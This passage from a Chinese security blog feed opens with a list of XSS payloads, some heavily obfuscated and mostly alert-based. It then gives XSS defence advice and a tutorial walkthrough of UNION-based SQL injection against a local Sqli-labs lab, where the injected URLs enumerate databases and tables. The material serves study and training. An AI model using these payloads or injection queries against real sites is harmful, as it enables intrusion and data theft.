&lt;script src=&quot;http:&#x2F;&#x2F;baidu.com&quot;&gt;&lt;&#x2F;script&gt;&lt;br &#x2F;&gt;&lt;script&gt;alert(&quot;XSS&quot;)&lt;&#x2F;script&gt;&lt;br &#x2F;&gt;&lt;scr&lt;script&gt;ipt&gt;alert(&quot;XSS&quot;)&lt;&#x2F;scr&lt;script&gt;ipt&gt;&lt;br &#x2F;&gt;&lt;SCRIPT&gt;a=&#x2F;XSS&#x2F; alert(a.source)&lt;&#x2F;SCRIPT&gt;&lt;br &#x2F;&gt;&lt;script&gt;alert(&#x2F;1&#x2F;.source)&lt;&#x2F;script&gt;&lt;br &#x2F;&gt;&lt;script&gt;alert(1);&lt;&#x2F;script&gt;&lt;br &#x2F;&gt;&lt;script&gt;prompt(1);&lt;&#x2F;script&gt;&lt;br &#x2F;&gt;&lt;script&gt;confirm(1);&lt;&#x2F;script&gt;&lt;br &#x2F;&gt;&lt;script&gt;alert(&#x2F;88199&#x2F;)&lt;&#x2F;script&gt;&lt;br &#x2F;&gt;&lt;script&gt;alert(`a`)&lt;&#x2F;script&gt;&lt;br &#x2F;&gt;&lt;script&gt;alert(&#x27;a&#x27;)&lt;&#x2F;script&gt;&lt;br &#x2F;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;&#x2F;SCRIPT&gt;&lt;br &#x2F;&gt;&lt;script&gt;eval(alert(1))&lt;&#x2F;script&gt;&lt;br &#x2F;&gt;&lt;script&gt;eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 50, 51, 41))&lt;&#x2F;script&gt;&lt;br &#x2F;&gt;&lt;script&gt;eval(&quot;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029&quot;)&lt;&#x2F;script&gt;&lt;br &#x2F;&gt;&lt;script&gt;eval(&#x27;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&#x27;)&lt;&#x2F;script&gt;&lt;br &#x2F;&gt;&lt;script&gt;setTimeout(&#x27;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&#x27;)&lt;&#x2F;script&gt;&lt;br &#x2F;&gt;&lt;script&gt;setTimeout(alert(1),0)&lt;&#x2F;script&gt;&lt;br &#x2F;&gt;&lt;script&gt;setTimeout`alert\x28\x27 xss \x27\x29`&lt;&#x2F;script&gt;&lt;br &#x2F;&gt;&lt;script&gt;setInterval(&#x27;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&#x27;)&lt;&#x2F;script&gt;&lt;br &#x2F;&gt;&lt;script src=data:text&#x2F;javascript,alert(1)&gt;&lt;&#x2F;script&gt;&lt;br &#x2F;&gt;&lt;script src=&amp;#100&amp;#97&amp;#116&amp;#97:text&#x2F;javascript,alert(1)&gt;&lt;&#x2F;script&gt;&lt;br &#x2F;&gt;&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(123)&lt;&#x2F;script&gt;&lt;br &#x2F;&gt;&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(1)&lt;&#x2F;script&gt;&lt;br &#x2F;&gt;&lt;script&gt;\u0061\u006C\u0065\u0072\u0074`a`&lt;&#x2F;script&gt;&lt;br &#x2F;&gt;&lt;script&gt;window[&#x27;alert&#x27;](0)&lt;&#x2F;script&gt;&lt;br &#x2F;&gt;&lt;script&gt;parent[&#x27;alert&#x27;](1)&lt;&#x2F;script&gt;&lt;br &#x2F;&gt;&lt;script&gt;self[&#x27;alert&#x27;](2)&lt;&#x2F;script&gt;&lt;br &#x2F;&gt;&lt;script&gt;top[&#x27;alert&#x27;](3)&lt;&#x2F;script&gt;&lt;br &#x2F;&gt;&lt;!--[if]&gt;&lt;script&gt;alert(1)&lt;&#x2F;script     --&gt;&lt;br &#x2F;&gt;&lt;script&gt;alert(&quot;xss&quot;);;;;;;;;;;;;;;;;;    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;&lt;&#x2F;script&gt;&lt;br &#x2F;&gt;&lt;script&gt;$=~[];$={___:++$,$$$$:(![]+&quot;&quot;)[$],__$:++$,$_$_:(![]+&quot;&quot;)[$],_$_:++$,$_$$:({}+&quot;&quot;)[$],$$_$:($[$]+&quot;&quot;)[$],_$$:++$,$$$_:(!&quot;&quot;+&quot;&quot;)[$],$__:++$,$_$:++$,$$__:({}+&quot;&quot;)[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+&quot;&quot;)[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+&quot;&quot;)[$.__$])+((!$)+&quot;&quot;)[$._$$]+($.__=$.$_[$.$$_])+($.$=(!&quot;&quot;+&quot;&quot;)[$.__$])+($._=(!&quot;&quot;+&quot;&quot;)[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!&quot;&quot;+&quot;&quot;)[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+&quot;\&quot;&quot;+$.$_$_+(![]+&quot;&quot;)[$._$_]+$.$$$_+&quot;\\&quot;+$.__$+$.$$_+$._$_+$.__+&quot;(&quot;+$.___+&quot;)&quot;+&quot;\&quot;&quot;)())();&lt;&#x2F;script&gt;&lt;br &#x2F;&gt;&lt;script&gt;(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()&lt;&#x2F;script&gt;
# XSS漏洞防御
客户端用户
&lt;ul&gt;
&lt;li&gt;使用高版本浏览器&lt;&#x2F;li&gt;
&lt;li&gt;Firefox使用CSP、NoScript等扩展功能&lt;&#x2F;li&gt;
&lt;li&gt;个人安全软件&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Web程序员&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;使用HttpOnly&lt;&#x2F;li&gt;
&lt;li&gt;完善的输入、输出检查&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;关于HttpOnly&lt;br &#x2F;&gt;HttpOnly的作用不是过滤XSS跨站脚本攻击，而是浏览器将禁止页面的JavaScript访问带有HttpOnly属性的cookie，解决XSS跨站脚本攻击后的cookie会话劫持行为&lt;br &#x2F;&gt;HttpOnly是在Set-Cookie时进行标记的，设置的cookie头格式如下&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623856471203-852d27f3-75c1-4021-9b2b-e6e321dd7070.png#align=left&amp;amp;display=inline&amp;amp;height=99&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-16%20%E4%B8%8B%E5%8D%8811.14.14.png&amp;amp;originHeight=208&amp;amp;originWidth=798&amp;amp;size=83538&amp;amp;status=done&amp;amp;style=none&amp;amp;width=378&quot; alt=&quot;截屏2021-06-16 下午11.14.14.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;以PHP为例，在PHP 5.2版本时就已经在set-cookie函数中加入了对HttpOnly的支持，如&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623856855933-c8bda01d-2d9c-498a-ac87-7094112aab0c.png#align=left&amp;amp;display=inline&amp;amp;height=140&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-16%20%E4%B8%8B%E5%8D%8811.20.43.png&amp;amp;originHeight=140&amp;amp;originWidth=1498&amp;amp;size=101722&amp;amp;status=done&amp;amp;style=none&amp;amp;width=1498&quot; alt=&quot;截屏2021-06-16 下午11.20.43.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;检查输入输出&lt;&#x2F;strong&gt;&lt;br &#x2F;&gt;由于三种XSS跨站脚本攻击类型的漏洞成因各不相同，针对输入输出的检查一部分适用于反射型XSS与存储型XSS，而另外一些检查适用于基于DOM的XSS&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;输入检查&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;在大多数的时候都是对可信字符的检查或输入数据格式的检查，如用户输入的注册账号信息中只允许包括字母、数字、下划线和汉字等，对于输入的一切非白名单内的字符均认为是非法输入。数据格式如输入的IP地址、电话号码、邮件地址、日期等数据都具有一定的格式规范，只有符合数据规范的输入信息才允许通过检查。&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;输出检查&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;输出检查主要是针对数据展示过程中，应该对数据信息进行HTML编码处理，将可能存在导致XSS跨站脚本攻击的恶意字符进行编码，在不影响正常数据显示的前提条件下，过滤恶意字符。&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;常见特殊字符&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;常见的可能造成XSS跨站脚本攻击的字符及其HTML编码如下：&lt;br &#x2F;&gt;&amp;quot;   &#x27;   &amp;amp;   &amp;gt;   &amp;lt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;常见特殊字符&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;除了常用的编码外，任何字符都可以使用其ascii码进行html编码，如：%   *&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;特殊性&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;基于DOM的XSS跨站脚本攻击发生时，恶意数据的格式与传统的XSS跨站脚本攻击数据格式有一定的差异，甚至可以在不经过服务器端的处理和相应的情况下，直接对客户端实施攻击行为。&lt;&#x2F;p&gt;
&lt;p&gt;DOM BASED XSS输入输出检测&lt;br &#x2F;&gt;在客户端部署相应的安全检测代码的过滤效果要比在服务器端检测的效果更明显。&lt;br &#x2F;&gt;客户端检测代码来保证用户输入的数据只包含字母、数字和空格&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623858063517-613f51fa-fa0e-4159-9ca5-2b0fc7853908.png#align=left&amp;amp;display=inline&amp;amp;height=123&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-16%20%E4%B8%8B%E5%8D%8811.40.51.png&amp;amp;originHeight=312&amp;amp;originWidth=1246&amp;amp;size=251815&amp;amp;status=done&amp;amp;style=none&amp;amp;width=493&quot; alt=&quot;截屏2021-06-16 下午11.40.51.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;输入检查要实现上述数据检查的功能&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;URL参数名称&lt;&#x2F;li&gt;
&lt;li&gt;参数值类型及内容检测&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>SQL注入</title>
		<published>2021-06-07T00:00:00+00:00</published>
		<updated>2021-06-07T00:00:00+00:00</updated>
		<link href="https://baz.ee/sqlzhu-ru/" type="text/html"/>
		<id>https://baz.ee/sqlzhu-ru/</id>
		<content type="html">&lt;h1 id=&quot;shi-yao-shi-sqlzhu-ru&quot;&gt;什么是SQL注入？&lt;&#x2F;h1&gt;
&lt;p&gt;SQL注入是服务器端&lt;strong&gt;未严格校验&lt;&#x2F;strong&gt;客户端发送的数据，而导致服务端SQL语句被&lt;strong&gt;恶意修改&lt;&#x2F;strong&gt;并&lt;strong&gt;成功执行&lt;&#x2F;strong&gt;的行为称为SQL注入。&lt;&#x2F;p&gt;
&lt;h1 id=&quot;wei-shi-yao-hui-you-sqlzhu-ru&quot;&gt;为什么会有SQL注入&lt;&#x2F;h1&gt;
&lt;ul&gt;
&lt;li&gt;代码对带入SQL语句的参数过滤不严格&lt;&#x2F;li&gt;
&lt;li&gt;未启用框架的安全配置，例如：PHP的magic_quotes_gpc&lt;&#x2F;li&gt;
&lt;li&gt;未使用框架安全的查询方法&lt;&#x2F;li&gt;
&lt;li&gt;测试接口未删除&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
&lt;ul&gt;
&lt;li&gt;未启用防火墙&lt;&#x2F;li&gt;
&lt;li&gt;未使用其他的安全防护设备&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h1 id=&quot;sqlzhu-ru-de-ye-wu-chang-jing-ji-wei-hai&quot;&gt;SQL注入的业务场景及危害&lt;&#x2F;h1&gt;
&lt;p&gt;Web页面一般存在SQL注入的业务场景为登录功能、搜索功能、商品购买、文件上传等与数据库有交互的场景。这些场景一但被SQL注入，则可能会导致数据库中存放的用户的隐私信息被泄露、网页被篡改、网站被挂马、数据库被恶意篡改、服务器被远程控制等影响。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;任何和数据库产生交互的地方便有可能存在注入&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;h1 id=&quot;sqlzhu-ru-de-fen-lei&quot;&gt;SQL注入的分类&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;an-zhao-qing-qiu-fang-fa-fen-lei&quot;&gt;按照请求方法分类&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;GET型注入&lt;&#x2F;li&gt;
&lt;li&gt;POST型注入&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;an-zhao-sqlshu-ju-lei-xing-fen-lei&quot;&gt;按照SQL数据类型分类&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;整型注入&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;字符型注入&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;报错注入&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;双注入&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;布尔盲注&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;时间盲注&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Cookie注入&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;User-Agent注入&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h1 id=&quot;sqlzhu-ru-bu-zou&quot;&gt;SQL注入步骤：&lt;&#x2F;h1&gt;
&lt;p&gt;首先判断业务逻辑&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;判断是否有注入（判断是否未严格校验） --&amp;gt;第一要素
&lt;ol&gt;
&lt;li&gt;可控参数的改变能否影响页面的显示结果&lt;&#x2F;li&gt;
&lt;li&gt;输入的SQL语句是否能报错（能通过数据库的报错，看到数据库的一些语句痕迹）&lt;&#x2F;li&gt;
&lt;li&gt;输入的SQL语句能否不报错（我们的语句能否成功闭合）&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;什么类型的注入&lt;&#x2F;li&gt;
&lt;li&gt;语句是否能够被恶意修改 --&amp;gt;第二个要素&lt;&#x2F;li&gt;
&lt;li&gt;是否能够成功执行 --&amp;gt;第三个要素&lt;&#x2F;li&gt;
&lt;li&gt;获取我们想要的数据&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h1 id=&quot;mysqlshu-ju-ku-jie-gou&quot;&gt;mysql数据库结构&lt;&#x2F;h1&gt;
&lt;p&gt;数据库-&amp;gt;表-&amp;gt;字段-&amp;gt;值&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;jpeg&#x2F;2424924&#x2F;1623143045202-33519c45-7b2e-4d51-83fc-a27c54e7ab77.jpeg#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=695&amp;amp;id=qMhCG&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=4e29459c94a9c70836fdb25446a9870f.jpeg&amp;amp;originHeight=695&amp;amp;originWidth=970&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=49584&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=970&quot; alt=&quot;4e29459c94a9c70836fdb25446a9870f.jpeg&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h1 id=&quot;sqlzhu-ru-shi-zhan&quot;&gt;SQL注入实战&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;zheng-xing-zhu-ru&quot;&gt;整型注入&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623143440305-737b846e-54c0-498e-8d5e-e9ec0250ce47.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=WREuD&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-08%20%E4%B8%8B%E5%8D%884.37.29.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=1572033&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-08 下午4.37.29.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;添加单引号，根据报错，判断注入类型&lt;&#x2F;p&gt;
&lt;p&gt;首先判断此SQL语句所查询的数据有几列（或者使用order by二分法）&lt;br &#x2F;&gt;http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;Less-2&#x2F;?id=4 union select 1,2,3 %23&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623144018746-c60e56ca-2153-4258-bf07-69514255b673.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=hEVSR&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-08%20%E4%B8%8B%E5%8D%885.19.53.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=943778&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-08 下午5.19.53.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;判断页面输出的是所查询的哪一个数据（判断位置）&lt;br &#x2F;&gt;http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;Less-2&#x2F;?id=99999 union select 1,user(),3 %23&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623144112212-251d7e84-00e4-4cd4-ab08-b9cdb79a7bc9.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=V3jG2&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-08%20%E4%B8%8B%E5%8D%885.21.33.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=948626&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-08 下午5.21.33.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;查询数据库&lt;br &#x2F;&gt;http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;Less-2&#x2F;?id=99999 union select 1,user(),schema_name from information_schema.schemata %23&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623144360178-c6088b48-b4f9-4244-bdbb-baac1bc6d064.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=ywtBf&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-08%20%E4%B8%8B%E5%8D%885.25.38.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=969857&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-08 下午5.25.38.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;页面只输出一个数据库，若要全部输出，则用group_concat()函数&lt;br &#x2F;&gt;http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;Less-2&#x2F;?id=99999 union select 1,user(),group_concat(schema_name) from information_schema.schemata %23&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623144501163-de4bb2a8-6d40-45ff-ab55-3680b52db3b3.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=wlYz8&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-08%20%E4%B8%8B%E5%8D%885.28.00.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=986064&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-08 下午5.28.00.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;查询当前数据库名&lt;br &#x2F;&gt;http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;Less-2&#x2F;?id=99999 union select 1,database(),group_concat(schema_name) from information_schema.schemata %23&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623144636510-29e3fe63-da0e-429f-844d-a2ebe2d8814a.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;height=1662&amp;amp;id=sn9wV&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-08%20%E4%B8%8B%E5%8D%885.30.15.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;size=985677&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-08 下午5.30.15.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;查询当前数据库下的所有表名&lt;br &#x2F;&gt;http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;Less-2&#x2F;?id=99999 union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database() %23&lt;br &#x2F;&gt;&lt;img 